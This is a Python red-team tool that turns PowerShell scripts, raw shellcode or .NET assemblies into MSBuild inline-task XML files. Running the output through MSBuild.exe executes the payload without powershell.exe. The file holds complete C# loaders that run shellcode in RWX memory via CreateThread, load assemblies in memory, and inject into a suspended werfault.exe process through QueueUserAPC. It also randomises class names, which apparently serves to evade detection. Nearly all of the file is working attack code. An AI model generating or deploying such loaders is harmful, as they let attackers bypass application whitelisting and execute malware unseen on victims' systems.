#!/usr/bin/python3
#
# Red-Teaming script that will leverage MSBuild technique to convert Powershell input payload or
# .NET/CLR assembly EXE file into inline-task XML file that can be further launched by:
#
#   %WINDIR%\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe
# or
#   %WINDIR%\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe
#
# This script can embed following data within constructed CSharp Task:
#   - Powershell code
#   - raw Shellcode in a separate thread via CreateThread
#   - .NET Assembly via Assembly.Load
#
# Mariusz Banach / mgeeky, <mb@binary-offensive.com>
#

import re
import os
import io
import sys
import gzip
import base64
import string
import pefile
import struct
import random
import binascii
import argparse


def getCompressedPayload(filePath, returnRaw = False):
    out = io.BytesIO()
    encoded = ''
    with open(filePath, 'rb') as f:
        inp = f.read()

        with gzip.GzipFile(fileobj = out, mode = 'w') as fo:
            fo.write(inp)

        encoded = base64.b64encode(out.getvalue())
        if returnRaw:
            return encoded

    powershell = "$s = New-Object IO.MemoryStream(, [Convert]::FromBase64String('{}')); IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s, [IO.Compression.CompressionMode]::Decompress))).ReadToEnd();".format(
        encoded.decode()
    )
    return powershell

def getPayloadCode(payload):
    return f'shellcode = "{payload}";'

    payloadCode = '\n'

    N = 50000
    codeSlices = map(lambda i: payload[i:i+N], range(0, len(payload), N))

    variables = []

    num = 1
    for code in codeSlices:
        payloadCode += f'string shellcode{num} = "{code}";\n'
        variables.append(f'shellcode{num}')
        num += 1

    concat = 'shellcode = ' + ' + '.join(variables) + ';\n'
    payloadCode += concat

    return payloadCode

def getInlineTask(module, payload, _format, apc, targetProcess):
    templateName = ''.join(random.choice(string.ascii_letters) for x in range(random.randint(5, 15)))
    if len(module) > 0:
        templateName = module

    taskName = ''.join(random.choice(string.ascii_letters) for x in range(random.randint(5, 15)))

    payloadCode = getPayloadCode(payload.decode())
    launchCode = ''

    if _format == 'exe':

        exeLaunchCode = string.Template('''<Task>
      <Reference Include="System.Management.Automation" />
      <Code Type="Class" Language="cs">
        <![CDATA[       
            using System.Management.Automation;
            using System.Management.Automation.Runspaces;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;
            using System;
            using System.Diagnostics;
            using System.Reflection;
            using System.Runtime.InteropServices;
            using System.IO;
            using System.IO.Compression;
            using System.Text;

            public class $templateName : Task {

                public static byte[] DecompressString(string compressedText) {
                    byte[] data = Convert.FromBase64String(compressedText);

                    using (var ms = new MemoryStream(data)) {
                        using (var gzip = new GZipStream(ms, CompressionMode.Decompress)) {
                            using (var decompressed = new MemoryStream()) {
                                gzip.CopyTo(decompressed);
                                return decompressed.ToArray();
                            }
                        }
                    }
                }

                public override bool Execute() {

                    string shellcode = "";
                    $payloadCode
                    byte[] payload = DecompressString(shellcode);

                    Assembly asm = Assembly.Load(payload);
                    MethodInfo method = asm.EntryPoint;
                    object instance = asm.CreateInstance(method.Name);
                    method.Invoke(instance, new object[] { new string[] { } }); 
                    return true;
                }                                
            }           
        ]]>
      </Code>
    </Task>''').safe_substitute(
            payloadCode = payloadCode,
            templateName = templateName
        )

        launchCode = exeLaunchCode

    elif _format == 'raw':
        shellcodeLoader = ''

        if not apc:
            shellcodeLoader = string.Template('''<Task>
    <Reference Include="System.Management.Automation" />
      <Code Type="Class" Language="cs">
        <![CDATA[       
            using System.Management.Automation;
            using System.Management.Automation.Runspaces;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;
            using System;
            using System.Diagnostics;
            using System.Reflection;
            using System.Runtime.InteropServices;
            using System.IO;
            using System.IO.Compression;
            using System.Text;

            public class $templateName : Task {

                [DllImport("kernel32")]
                private static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, UInt32 flAllocationType, UInt32 flProtect);

                [DllImport("kernel32")]
                private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, UInt32 dwFreeType);

                [DllImport("kernel32")]
                private static extern IntPtr CreateThread( UInt32 lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId );

                [DllImport("kernel32")]
                private static extern bool CloseHandle(IntPtr hHandle);

                [DllImport("kernel32")]
                private static extern UInt32 WaitForSingleObject( IntPtr hHandle, UInt32 dwMilliseconds );

                private static UInt32 MEM_COMMIT = 0x1000;
                private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
                private static UInt32 MEM_RELEASE = 0x8000;

                public static byte[] DecompressString(string compressedText) {
                    byte[] data = Convert.FromBase64String(compressedText);

                    using (var ms = new MemoryStream(data)) {
                        using (var gzip = new GZipStream(ms, CompressionMode.Decompress)) {
                            using (var decompressed = new MemoryStream()) {
                                gzip.CopyTo(decompressed);
                                return decompressed.ToArray();
                            }
                        }
                    }
                }

                public override bool Execute() {

                    string shellcode = "";
                    $payloadCode
                    byte[] payload = DecompressString(shellcode);

                    IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)payload.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                    Marshal.Copy(payload, 0, funcAddr, payload.Length);
                    IntPtr hThread = IntPtr.Zero;
                    UInt32 threadId = 0;

                    hThread = CreateThread(0, 0, funcAddr, IntPtr.Zero, 0, ref threadId);
                    WaitForSingleObject(hThread, 0xFFFFFFFF);

                    CloseHandle(hThread);
                    VirtualFree(funcAddr, 0, MEM_RELEASE);

                    return true;
                }                                
            }           
        ]]>
      </Code>
    </Task>''').safe_substitute(
                templateName = templateName,
                payloadCode = payloadCode
            )
        else:
            #
            # The below MSBuild template comes from:
            #   https://github.com/infosecn1nja/MaliciousMacroMSBuild
            #
            shellcodeLoader = string.Template('''<Task>
  <Code Type="Class" Language="cs">
  <![CDATA[
    using System;
    using System.Reflection;
    using Microsoft.CSharp;
    using Microsoft.Build.Framework;
    using Microsoft.Build.Utilities;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    using System.IO;
    using System.IO.Compression;
    using System.Text;

    public class $templateName : Task, ITask
    {
        public static byte[] DecompressString(string compressedText) {
            byte[] data = Convert.FromBase64String(compressedText);

            using (var ms = new MemoryStream(data)) {
                using (var gzip = new GZipStream(ms, CompressionMode.Decompress)) {
                    using (var decompressed = new MemoryStream()) {
                        gzip.CopyTo(decompressed);
                        return decompressed.ToArray();
                    }
                }
            }
        }

        public override bool Execute() {

            string shellcode = "";
            $payloadCode
            byte[] payload = DecompressString(shellcode);
              
            string processpath = Environment.ExpandEnvironmentVariables(@"$targetProcess");
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            bool success = CreateProcess(null, processpath, 
            IntPtr.Zero, IntPtr.Zero, false, 
            ProcessCreationFlags.CREATE_SUSPENDED, 
            IntPtr.Zero, null, ref si, out pi);

            IntPtr resultPtr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, payload.Length,MEM_COMMIT, PAGE_READWRITE);
            IntPtr bytesWritten = IntPtr.Zero;
            bool resultBool = WriteProcessMemory(pi.hProcess,resultPtr,payload,payload.Length, out bytesWritten);

            IntPtr sht = OpenThread(ThreadAccess.SET_CONTEXT, false, (int)pi.dwThreadId);
            uint oldProtect = 0;
            resultBool = VirtualProtectEx(pi.hProcess,resultPtr, payload.Length,PAGE_EXECUTE_READ, out oldProtect);
            IntPtr ptr = QueueUserAPC(resultPtr,sht,IntPtr.Zero);

            IntPtr ThreadHandle = pi.hThread;
            ResumeThread(ThreadHandle);
            return true;
        }
        
        private static UInt32 MEM_COMMIT = 0x1000;
       
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        private static UInt32 PAGE_READWRITE = 0x04;
        private static UInt32 PAGE_EXECUTE_READ = 0x20;
        
        [Flags]
        public enum ProcessAccessFlags : uint
        {
          All = 0x001F0FFF,
          Terminate = 0x00000001,
          CreateThread = 0x00000002,
          VirtualMemoryOperation = 0x00000008,
          VirtualMemoryRead = 0x00000010,
          VirtualMemoryWrite = 0x00000020,
          DuplicateHandle = 0x00000040,
          CreateProcess = 0x000000080,
          SetQuota = 0x00000100,
          SetInformation = 0x00000200,
          QueryInformation = 0x00000400,
          QueryLimitedInformation = 0x00001000,
          Synchronize = 0x00100000
        }
        
        [Flags]
        public enum ProcessCreationFlags : uint
        {
          ZERO_FLAG = 0x00000000,
          CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
          CREATE_DEFAULT_ERROR_MODE = 0x04000000,
          CREATE_NEW_CONSOLE = 0x00000010,
          CREATE_NEW_PROCESS_GROUP = 0x00000200,
          CREATE_NO_WINDOW = 0x08000000,
          CREATE_PROTECTED_PROCESS = 0x00040000,
          CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
          CREATE_SEPARATE_WOW_VDM = 0x00001000,
          CREATE_SHARED_WOW_VDM = 0x00001000,
          CREATE_SUSPENDED = 0x00000004,
          CREATE_UNICODE_ENVIRONMENT = 0x00000400,
          DEBUG_ONLY_THIS_PROCESS = 0x00000002,
          DEBUG_PROCESS = 0x00000001,
          DETACHED_PROCESS = 0x00000008,
          EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
          INHERIT_PARENT_AFFINITY = 0x00010000
        }

        public struct PROCESS_INFORMATION
        {
          public IntPtr hProcess;
          public IntPtr hThread;
          public uint dwProcessId;
          public uint dwThreadId;
        }

        public struct STARTUPINFO
        {
          public uint cb;
          public string lpReserved;
          public string lpDesktop;
          public string lpTitle;
          public uint dwX;
          public uint dwY;
          public uint dwXSize;
          public uint dwYSize;
          public uint dwXCountChars;
          public uint dwYCountChars;
          public uint dwFillAttribute;
          public uint dwFlags;
          public short wShowWindow;
          public short cbReserved2;
          public IntPtr lpReserved2;
          public IntPtr hStdInput;
          public IntPtr hStdOutput;
          public IntPtr hStdError;
        }
        
        [Flags]
        public enum    ThreadAccess : int
        {
          TERMINATE           = (0x0001)  ,
          SUSPEND_RESUME      = (0x0002)  ,
          GET_CONTEXT         = (0x0008)  ,
          SET_CONTEXT         = (0x0010)  ,
          SET_INFORMATION     = (0x0020)  ,
          QUERY_INFORMATION       = (0x0040)  ,
          SET_THREAD_TOKEN    = (0x0080)  ,
          IMPERSONATE         = (0x0100)  ,
          DIRECT_IMPERSONATION    = (0x0200)
        }
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle,
          int dwThreadId);
        
        [DllImport("kernel32.dll",SetLastError = true)]
        public static extern bool WriteProcessMemory(
          IntPtr hProcess,
          IntPtr lpBaseAddress,
          byte[] lpBuffer,
          int nSize,
          out IntPtr lpNumberOfBytesWritten);
        
        [DllImport("kernel32.dll")]
        public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
        
        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(UInt32 lpStartAddr,
           Int32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32.dll", SetLastError = true )]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
        Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
         ProcessAccessFlags processAccess,
         bool bInheritHandle,
         int processId
        );
        
         [DllImport("kernel32.dll")]
        public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
                     bool bInheritHandles, ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment,
                    string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll")]
        public static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll")]
        public static extern uint SuspendThread(IntPtr hThread);
        
        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
        int dwSize, uint flNewProtect, out uint lpflOldProtect);
      }
        ]]>
      </Code>
    </Task>''').safe_substitute(
        templateName = templateName,
        payloadCode = payloadCode,
        targetProcess = targetProcess
    )

        launchCode = shellcodeLoader

    else:
        powershellLaunchCode = string.Template('''<Task>
    <Reference Include="System.Management.Automation" />
      <Code Type="Class" Language="cs">
        <![CDATA[       
            using System.IO;
            using System.IO.Compression;
            using System.Management.Automation;
            using System.Management.Automation.Runspaces;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;
            using System.Text;

            public class $templateName : Task {
                public static byte[] DecompressString(string compressedText) {
                    byte[] data = Convert.FromBase64String(compressedText);

                    using (var ms = new MemoryStream(data)) {
                        using (var gzip = new GZipStream(ms, CompressionMode.Decompress)) {
                            using (var decompressed = new MemoryStream()) {
                                gzip.CopyTo(decompressed);
                                return decompressed.ToArray();
                            }
                        }
                    }
                }

                public override bool Execute() {

                    string shellcode = "";
                    $payloadCode
                    byte[] payload = DecompressString(shellcode);
                    string decoded = System.Text.Encoding.UTF8.GetString(payload);

                    Runspace runspace = RunspaceFactory.CreateRunspace();
                    runspace.Open();

                    Pipeline pipeline = runspace.CreatePipeline();
                    pipeline.Commands.AddScript(decoded);
                    pipeline.Invoke();

                    runspace.Close();
                    return true;
                }                                
            }           
        ]]>
      </Code>
    </Task>''').safe_substitute(
            templateName = templateName,
            payloadCode = payloadCode
        )

        launchCode = powershellLaunchCode


    template = string.Template('''<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003">

  <!--  Based on Casey Smith work, Twitter: @subTee                      -->
  <!--  Automatically generated using `generateMSBuildXML.py` utility    -->
  <!--  by Mariusz Banach / mgeeky <mb@binary-offensive.com>                 -->

  <Target Name="$taskName">
    <$templateName />
  </Target>
  <UsingTask TaskName="$templateName" TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll" >
    $launchCode
  </UsingTask>
</Project>''').safe_substitute(
        taskName = taskName,
        templateName = templateName,
        launchCode = launchCode
    )

    return template

def detectFileIsExe(filePath, forced = False):
    try:
        pe = pefile.PE(filePath)
        return True
    except pefile.PEFormatError as e:
        return False

def minimize(output):
    output = re.sub(r'\s*\<\!\-\- .* \-\-\>\s*\n', '', output)
    output = output.replace('\n', '')
    output = re.sub(r'\s{2,}', ' ', output)
    output = re.sub(r'\s+([^\w])\s+', r'\1', output)
    output = re.sub(r'([^\w"])\s+', r'\1', output)

    variables = {
        'payload' : 'x',
        'method' : 'm',
        'asm' : 'a',
        'instance' : 'o',
        'pipeline' : 'p',
        'runspace' : 'r',
        'decoded' : 'd',
        'MEM_COMMIT' : 'c1',
        'PAGE_EXECUTE_READWRITE' : 'c2',
        'MEM_RELEASE' : 'c3',
        'funcAddr' : 'v1',
        'hThread' : 'v2',
        'threadId' : 'v3',
        'lpAddress' : 'p1',
        'dwSize' : 'p2',
        'flAllocationType' : 'p3',
        'flProtect' : 'p4',
        'dwFreeType' : 'p5',
        'lpThreadAttributes' : 'p6',
        'dwStackSize' : 'p7',
        'lpStartAddress' : 'p8',
        'param' : 'p9',
        'dwCreationFlags' : 'p10',
        'lpThreadId' : 'p11',
        'dwMilliseconds' : 'p12',
        'hHandle' : 'p13',
        'processpath' : 'p14',
        'shellcode' : 'p15',
        'resultPtr' : 'p16',
        'bytesWritten' : 'p17',
        'resultBool' : 'p18',
        'ThreadHandle' : 'p19',
        'PAGE_READWRITE' : 'p20',
        'PAGE_EXECUTE_READ' : 'p21',
    }

    # Variables renaming tends to corrupt Base64 streams.
    #for k, v in variables.items():
    #    output = output.replace(k, v)

    return output

def opts(argv):
    parser = argparse.ArgumentParser(prog = argv[0], usage='%(prog)s [options] <inputFile>')
    parser.add_argument('inputFile', help = 'Input file to be encoded within XML. May be either Powershell script, raw binary Shellcode or .NET Assembly (PE/EXE) file.')

    parser.add_argument('-o', '--output', metavar='PATH', default='', type=str, help = 'Output path where to write generated script. Default: stdout')
    parser.add_argument('-n', '--module', metavar='NAME', default='', type=str, help = 'Specifies custom C# module name for the generated Task (for needs of shellcode loaders such as DotNetToJScript or Donut). Default: auto generated name.')
    parser.add_argument('-m', '--minimize', action='store_true', help = 'Minimize the output XML file.')
    parser.add_argument('-b', '--encode', action='store_true', help = 'Base64 encode output XML file.')
    parser.add_argument('-e', '--exe', action='store_true', 
        help = 'Specified input file is an Mono/.Net assembly PE/EXE. WARNING: Launching EXE is currently possible ONLY WITH MONO/.NET assembly EXE/DLL files, not an ordinary native PE/EXE!')
    parser.add_argument('-r', '--raw', action='store_true', help = 'Specified input file is a raw Shellcode to be injected in self process in a separate Thread (VirtualAlloc + CreateThread)')
    parser.add_argument('--queue-apc', action='store_true', 
        help = 'If --raw was specified, generate C# code template with CreateProcess + WriteProcessMemory + QueueUserAPC process injection technique instead of default CreateThread.')
    parser.add_argument('--target-process', metavar='PATH', default=r'%windir%\system32\werfault.exe', 
        help = r'This option specifies target process path for remote process injection in --queue-apc technique. May use environment variables. May also contain command line for spawned process, example: --target-process "%%windir%%\system32\werfault.exe -l -u 1234"')
    parser.add_argument('--only-csharp', action='store_true', help = 'Return generated C# code instead of MSBuild\'s XML.')

    args = parser.parse_args()

    if args.exe and args.raw:
        sys.stderr.write('[!] --exe and --raw options are mutually exclusive!\n')
        sys.exit(-1)

    args.target_process = args.target_process.replace("^%", '%')

    return args

def main(argv):
    sys.stderr.write('''
        :: Powershell via MSBuild inline-task XML payload generation script
        To be used during Red-Team assignments to launch Powershell payloads without using 'powershell.exe'
        Mariusz Banach / mgeeky, <mb@binary-offensive.com>

''')
    if len(argv) < 2:
        print('Usage: ./generateMSBuildXML.py [options] <inputFile>')
        sys.exit(-1)

    args = opts(argv)

    _format = 'powershell'

    if len(args.inputFile) > 0 and not os.path.isfile(args.inputFile):
        sys.stderr.write('[?] Input file does not exists.\n\n')
        return False

    if args.exe:
        if not detectFileIsExe(args.inputFile, args.exe):
            sys.stderr.write('[?] File not recognized as PE/EXE.\n\n')
            return False

        _format = 'exe'
        sys.stderr.write('[?] File recognized as PE/EXE.\n\n')
        with open(args.inputFile, 'rb') as f:
            payload = f.read()

    elif args.raw:
        _format = 'raw'
        sys.stderr.write('[?] File specified as raw Shellcode.\n\n')
        with open(args.inputFile, 'rb') as f:
            payload = f.read()

    else:
        sys.stderr.write('[?] File not recognized as PE/EXE.\n\n')

        if args.inputFile.endswith('.exe'):
            return False
            
    payload = getCompressedPayload(args.inputFile, _format != 'powershell')
    output = getInlineTask(args.module, payload, _format, args.queue_apc, args.target_process)

    if args.only_csharp:
        m = re.search(r'\<\!\[CDATA\[(.+)\]\]\>', output, re.M|re.S)
        if m:
            output = m.groups(0)[0]

    if args.minimize:
        output = minimize(output)

    if args.encode:
        if len(args.output) > 0:
            with open(args.output, 'w') as f:
                f.write(base64.b64encode(output))
        else:
            print(base64.b64encode(output))
    else:
        if len(args.output) > 0:
            with open(args.output, 'w') as f:
                f.write(output)
        else:
            print(output)

    msbuildPath = r'%WINDIR%\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe'
    if 'PROGRAMFILES(X86)' in os.environ:
        msbuildPath = r'%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe'

    sys.stderr.write('''

=====================================

Execute this XML file like so:

{} file.xml
    '''.format(msbuildPath))

if __name__ == '__main__':
    main(sys.argv)
